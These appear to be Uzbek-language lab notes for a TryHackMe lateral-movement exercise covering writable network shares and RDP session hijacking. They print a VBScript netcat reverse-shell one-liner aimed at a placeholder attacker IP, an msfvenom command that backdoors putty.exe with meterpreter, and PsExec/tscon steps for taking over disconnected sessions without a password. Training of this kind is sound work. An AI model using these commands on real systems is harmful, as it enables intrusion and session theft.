## 🧠 1. Foydalanuvchi harakatlarini suiste’mol qilish

Tizimdagi administrator yoki foydalanuvchi ba'zi ishlarni bajarayotganda hujumchi ularning faoliyatidan foydalanib tizimga kirishi mumkin. Bu quyidagilar orqali amalga oshiriladi:

---

## 📂 2. Yoziladigan (writable) Network Share'dan foydalanish

### ❓ Bu nima degani?

Kompaniyalarda tarmoqda ulashilgan papkalar (network share) bo‘ladi — masalan: `\\10.10.28.6\myshare`.

Agar bu papkaga yozish mumkin bo‘lsa, hujumchi unga zararli fayl yoki shortcut (`.lnk`) joylashtirishi mumkin.

### 🧪 Real misol:

#### ✅ `.vbs` faylga backdoor joylashtirish:

```vbscript
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

🧠 Bu script ochilganda:

1. `nc64.exe` yuklanadi va `%temp%` papkaga nusxa ko‘chiriladi.
2. So‘ng attackerga reverse shell ochiladi.

#### ✅ `.exe` faylni backdoor qilish (masalan, `putty.exe`):

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -b "\x00" -f exe -o puttyX.exe
```

🧠 Yangi `puttyX.exe` asl dastur kabi ishlaydi, lekin fon rejimida attackerga ulanish yuboradi.

---

## 🖥️ 3. RDP Session Hijacking

### ❓ Bu nima?

Administrator RDP orqali serverga ulanadi, lekin **log out** qilmaydi — shunchaki **oynani yopadi**. Bu holda sessiya **Disc. (disconnected)** holatda qoladi.

> Bu sessiyani **SYSTEM darajadagi foydalanuvchi** hijack qilishi mumkin — ya’ni **parolsiz boshqa sessiyaga ulanadi.**

---

## ✅ RDP Session Hijack bosqichlari

### 1. THMJMP2 ga **admin huquqi** bilan RDP orqali ulaning:

```bash
xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
```

> Creds: `http://distributor.za.tryhackme.com/creds_t2`

---

### 2. `cmd.exe` ni administrator sifatida ishga tushiring

Windowsda: `Start` → `cmd` → `Run as administrator`

---

### 3. SYSTEM huquqini oling:

```cmd
C:\tools\PsExec64.exe -s cmd.exe
```

Bu sizga SYSTEM darajada buyruq oynasi ochadi.

---

### 4. Mavjud sessiyalarni ko‘ring:

```cmd
query user
```

Namuna natija:

```
USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
 t1_toby.beck                             5  Disc            .  4/6/2022 7:21 AM
```

🧠 "Disc" — bu sessiyalarni hijack qilish mumkin.

---

### 5. Sessiyani hijack qilish:

```cmd
tscon <Session_ID> /dest:<SIZNING_SESSION>
```

Agar sizning sessiyangiz `rdp-tcp#6` va hijack qilmoqchi bo‘lgan sessiya ID'si `5` bo‘lsa:

```cmd
tscon 5 /dest:rdp-tcp#6
```

🟢 Endi siz `t1_toby.beck` foydalanuvchisi nomidan sessiyani egallaysiz — hech qanday parolsiz.

---

## 🎯 Mashq: Flag olish

1. THMJMP2 ga RDP orqali admin sifatida kiring
2. SYSTEM sessiya oching (`PsExec64`)
3. `query user` buyrug‘i bilan `t1_toby.beck` sessiyalarini toping
4. `tscon` yordamida `Disc.` sessiyasini hijack qiling
5. Hijack qilingan sessiyada **Desktop** ichidan **flag.txt** ni o‘qing.

---

## 🔐 Muhim eslatmalar:

* Faqat **Disconnected (Disc.)** sessiyalarni hijack qiling — boshqalarning faol sessiyalariga aralashmang.
* Windows Server 2019 da bu usul ishlamaydi — parol kerak bo‘ladi.
* Yoziladigan tarmoq papkalari har doim xavf manbai bo‘lishi mumkin.
